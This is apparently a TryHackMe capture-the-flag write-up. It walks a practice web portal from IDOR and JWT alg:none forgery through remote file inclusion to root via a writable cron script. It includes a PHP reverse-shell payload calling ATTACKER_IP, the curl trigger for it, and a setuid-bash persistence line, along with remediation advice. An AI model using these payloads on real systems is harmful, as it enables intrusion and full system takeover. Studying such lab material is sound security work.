# TryHackMe — Domino

**Difficulty:** Medium
**Category:** Web Application Pentest → Linux Privilege Escalation
**Target app:** NexusCorp Portal

> A cascading "domino" chain: each weakness unlocks the next. Multiple small misconfigurations and logic flaws combine into full system compromise. This writeup focuses on *the mechanism behind each step and why it is exploitable*, not just the commands.

Flags are partially masked to avoid posting answers publicly.

---

## Summary of the Kill Chain

| # | Foothold | Vulnerability | Mechanism |
|---|----------|---------------|-----------|
| 1 | API enumeration | **IDOR** (horizontal) | `profile.php?id=` returns any user's record incl. admin notes |
| 2 | Source disclosure | Broken access control | Admin panel source read via authenticated file API |
| 3 | File API | **RFI → RCE** | `files.php` fetches a remote URL and `eval()`s it |
| 4 | Credential reuse | Secrets in config | DB password reused as the system user's password |
| 5 | Local privesc | Writable root cron script | Group-writable script executed by root on a timer |

The chain in one line: **IDOR → JWT `alg:none` forgery → RFI/RCE → credential reuse (lateral) → writable root-scheduled script.**

---

## 1. Reconnaissance

### Port scan

```bash
nmap -sC -sV -O -p- <target>
```

Only two doors:

- **22/tcp** — OpenSSH 9.6p1 (Ubuntu)
- **80/tcp** — Apache 2.4.58, "NexusCorp Portal"

SSH has no creds yet, so the entry vector is the web app. SSH is held in reserve for later (lateral movement / privesc).

### Directory enumeration

```bash
gobuster dir -u http://nexus.thm -w directory-list-2.3-medium.txt -x php,html,txt,bak,zip,js
```

Endpoints worth noting, grouped by role in the chain:

- **Recon sources:** `/team.php`, `/backup/`
- **Auth surface:** `/index.php`, `/auth.php`, `/forgot.php`, `/reset.php`
- **Role-gated:** `/dashboard.php` (302→login), `/admin/` (403), `/api/`

### Information leaks

`/team.php` exposes 7 employees with the username scheme `firstname.lastname`. Two of them matter later:

- **Robert Wilson — DevOps Engineer**
- **Laura Hayes — CIO** (turns out to be the only `admin`)

`/backup/` has directory listing enabled and contains:

- `README.txt` → points to `config.enc` (AES-128-ECB) and says the key is in `static/app.js`
- `config.enc` → 112 bytes (7×16, valid ECB ciphertext)

`/static/app.js` leaks three things:

```javascript
_backupKey: 'N3xusK3y2024!!'   // AES key, padded to 16 bytes
// session = JSON.parse(atob(cookie))  -> client-readable session
// fetch('/api/auth/token.php')        -> JWT issuance endpoint
```

> **Why it matters:** any secret shipped in client-side JavaScript is, by definition, compromised. The frontend is fully readable by the attacker.

### Decrypting config.enc

```python
from Crypto.Cipher import AES
ct  = open('config.enc','rb').read()
key = (b'N3xusK3y2024!!' + b'\x00'*16)[:16]   # null-pad to 16 bytes
pt  = AES.new(key, AES.MODE_ECB).decrypt(ct)
print(pt)
```

Result:

```json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

A clean PKCS#7 tail (`\x0e` × 14) confirms the key/mode were correct. **Lesson:** readable plaintext + tidy padding = correct decryption.

> This file contains **no web password** — only the hint that an OS user `devops` exists. It is recon for the *end* of the chain, not a login. Not every decrypted artifact is a jackpot.

---

## 2. Initial Access — Credential Discovery

The password-reset flow (`forgot.php` / `reset.php`) was investigated but proved a dead end: the token is server-side only, parameter is strictly `token`, no IDOR binding, and the value is non-trivial (blind brute over a time window failed — **don't brute a format you've never seen**).

A username-enumeration flaw was confirmed (`forgot.php` returns different responses for valid vs invalid users), validating the target list.

The actual foothold was weak credentials. Manual verification (never trust the tool's word — hydra produced false positives due to a fail-marker mismatch):

```bash
for u in $(cat users.txt); do
  curl -s -o /dev/null -w "$u : %{http_code} %{redirect_url}\n" \
    -X POST http://nexus.thm/index.php -d "username=$u&password=password"
done
```

`HTTP 302 → dashboard.php` (success) for three users, including **`robert.wilson:password`** (our DevOps user).

> **Lesson:** verify tool output by hand. A trailing `.` in hydra's fail string made every attempt look like a "hit". `curl` checking the status code and redirect gives ground truth.

---

## 3. Session & JWT Analysis

### Session cookie is signed

```
nexus_session = base64(JSON) . <64-hex signature>
```

Decoded payload:

```json
{"user_id":4,"username":"robert.wilson","role":"user"}
```

The trailing 64-hex string is a SHA-256/HMAC signature. Testing `sha256(payload)` and `sha256(json)` against the real signature **did not match** → a server secret is involved → the cookie cannot be forged directly (yet).

> **Lesson:** a cheap test (two `sha256sum` calls) eliminated a whole attack branch instead of wasting hours on it.

### Dashboard reveals the API

Logged in as Robert, the dashboard exposes:

- `/api/files.php?name=` — internal file viewer (needs JWT)
- `/api/auth/token.php` — issues a JWT from the session
- `/api/users/profile.php?id=4` — **`id` parameter = IDOR candidate**

---

## 4. Flag 1 — IDOR (Horizontal Access)

```bash
for id in 1 2 3 4 5 6 7; do
  curl -s -b jar.txt "http://nexus.thm/api/users/profile.php?id=$id"; echo
done
```

`id=1` returns Laura's record:

```json
{"id":1,"username":"laura.hayes","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_***}"}
```

> **Flag 1:** `THM{1d0r_h0r1z0nt4l_4cc3ss_***}`

**Why vulnerable:** the endpoint returns any record by `id` with no authorization check tying the requested `id` to the session user. It also confirms **Laura = the only admin**, which sets the target for the JWT attack.

---

## 5. JWT Forgery — `alg:none`

JWT issued by the server:

```
header  = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"robert.wilson","role":"user","iat":...,"exp":...}
```

`files.php` returns `{"error":"Admin JWT required. Check your token payload."}` → it gates on `role:admin` inside the JWT.

**Correct methodology (the lesson from THM's feedback):** before brute-forcing the HS256 secret, exhaust the cheap logical attacks first. Test `alg:none`:

```bash
H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(echo -n '{"sub":"laura.hayes","role":"admin","iat":...,"exp":1782999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="$H.$P."     # empty signature

curl -s -H "Authorization: Bearer $FORGED" "http://nexus.thm/api/files.php?name=test"
```

> **Critical gotcha:** use `base64 -w0`. Without it, a line wrap in the base64 breaks the HTTP header and you get `400 Bad Request` — which *looks* like the attack failed when it didn't.

Response changes to `{"error":"Access denied: path must be within /var/www/html/"}` → **the role check passed**. The JWT was accepted with no signature because the server honored `alg:none`.

> **Methodology note:** brute-forcing the secret (`hashcat -m 16500`) was unnecessary and is the *last* resort. `alg:none` is a one-second check. Tooling like `jwt_tool -M at` automates this correct ordering (logic checks before brute). **Logic before computation.**

---

## 6. Flag 3 — RFI → RCE

With an admin JWT, reading source files within the webroot is allowed. Reading `files.php` itself exposes the killer:

```php
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    eval(str_replace("<?php", "", $remote));   // <-- RCE
}
// realpath() traversal check comes AFTER this block (never reached for URLs)
```

Reading `../config.php` also dumps the secrets:

```
DB_PASS    = D3v0ps!2024
JWT_SECRET = nexus_jwt_s3cr3t_2024
APP_SECRET = nexus_app_k3y_2024
```

**Exploiting the RFI for a reverse shell:**

```bash
# attacker: payload (no <?php — it is stripped by str_replace)
cat > shell.php <<'EOF'
<?php
$s=fsockopen("ATTACKER_IP",4444);
proc_open("/bin/bash -i",[0=>$s,1=>$s,2=>$s],$p);
EOF
python3 -m http.server 8000
# listener
nc -lvnp 4444
# trigger
curl -s -H "Authorization: Bearer $FORGED" \
  "http://nexus.thm/api/files.php?name=http://ATTACKER_IP:8000/shell.php"
```

Shell as `www-data`:

```bash
cat /opt/flag3.txt    # THM{...***}
```

> **Flag 3:** `THM{...***}` (in `/opt/flag3.txt`)

**Why vulnerable:** user input flows into `eval()` after a remote fetch, and the path-safety check is positioned *after* the URL branch, so it never applies to remote includes.

---

## 7. Flag 2 — Admin Panel (Source Read)

`/admin/` returns 403 at the Apache layer (IP/header restriction), independent of the session. But with RCE we read its source directly:

```bash
cat /var/www/html/admin/index.php
```

```php
// FLAG 2 is stored here
$flag2 = 'THM{bl1nd_x55_s3ss10n_h1j4ck_***}';
```

> **Flag 2:** `THM{bl1nd_x55_s3ss10n_h1j4ck_***}`

The intended path was a blind-XSS ticket fed to an admin bot (see §9); reading the source via RCE is the shortcut that bypasses the 403 entirely.

---

## 8. Flag 4 — Lateral Movement (Credential Reuse)

The DB password from `config.php` follows a `D3v0ps!` pattern — a strong candidate for the `devops` OS user:

```bash
su devops      # password: D3v0ps!2024
cat ~/user.txt
```

```
THM{s5h_cr3d_r3u53_l4t3r4l_***}
```

> **Flag 4:** `THM{s5h_cr3d_r3u53_l4t3r4l_***}`

**Why vulnerable:** an application/database secret was reused as an interactive OS account password. Distinct trust zones share one credential.

> **Lesson:** a reverse shell is fragile. Pivot to SSH (`ssh devops@target`) as soon as you have valid creds for stability.

---

## 9. Flag 5 — Root via Writable Scheduled Script

`sudo -l` shows devops has no sudo. Enumeration of running processes (a top privesc source) is key:

```bash
ps aux | grep root
# root ... /opt/admin_bot.py        <- custom root process
```

`/opt` is world-writable and contains `monitoring/` and `tools/`. The real vector:

```bash
ls -la /opt/monitoring/health_report.sh
# -rwxrwxr-- 1 root devops ... health_report.sh
```

Owner is **root**, group is **devops**, group has **write**. We are in group `devops` → we can edit a script that root runs.

**Confirm the trigger before planting a payload** (lesson carried from THM "Jump" — don't wait on a dead process):

```bash
/opt/tools/pspy64
# 2026/...  CMD: UID=0  PID=...  | /bin/bash /opt/monitoring/health_report.sh
```

`UID=0` confirms root executes it on a schedule (~every minute). Plant the payload:

```bash
echo 'chmod +s /bin/bash' >> /opt/monitoring/health_report.sh
# wait one interval, then:
ls -la /bin/bash          # -rwsr-sr-x
/bin/bash -p
id                        # euid=0(root)
cat /root/root.txt
```

```
THM{pr1v3sc_cr0n_r00t_***}
```

> **Flag 5:** `THM{pr1v3sc_cr0n_r00t_***}`

**Why vulnerable:** a script writable by a low-privileged group is executed by root on a timer. Whatever we write, root runs.

> `chmod +s /bin/bash` is preferred over a reverse shell here: network-independent, fires once, and gives an on-demand root shell with `bash -p`.

---

## 10. Cleanup (Professional Hygiene)

After rooting, restore the system to its prior state:

```bash
sed -i '/chmod +s \/bin\/bash/d' /opt/monitoring/health_report.sh
chmod u-s,g-s /bin/bash
```

Document every modification for the report. Leave the system no more vulnerable than you found it.

---

## Key Takeaways

- **Read parameter `name=` before sending** — the `email` vs `username` mismatch on the reset form wasted time. Match field names byte-for-byte.
- **Verify tool output manually** — hydra's false positives vs `curl` ground truth.
- **A changed error message = a passed control.** "Admin JWT required" → "path must be within" signaled the role gate was cleared.
- **JWT: logic before brute.** Decode → test `alg:none` / key confusion → only then brute the secret. `jwt_tool -M at` enforces this order.
- **`ps aux` is a privesc goldmine** — custom root processes hide among kernel threads.
- **Run pspy before planting a payload** — confirm the trigger and interval, don't wait on a dead process.
- **Pivot to SSH** off fragile reverse shells when you have creds.
- **Not every artifact is a login** — `config.enc` was end-of-chain recon, not an entry point.

---

## Vulnerability → Fix Mapping

| Vulnerability | Remediation |
|---|---|
| Secret key in client-side JS | Never ship secrets to the frontend; server-side config only |
| Directory listing on `/backup/` | Disable autoindex; move backups off webroot |
| IDOR on profile API | Enforce object-level authorization (requested id vs session user) |
| JWT `alg:none` accepted | Pin the algorithm server-side; reject `none` |
| RFI/`eval` in file API | Remove `eval`; disable `allow_url_fopen`; allow-list paths *before* fetch |
| Credential reuse | Unique credentials per trust zone |
| World-writable `/opt` + group-writable root script | Restrict permissions; root-run scripts owned and writable only by root |
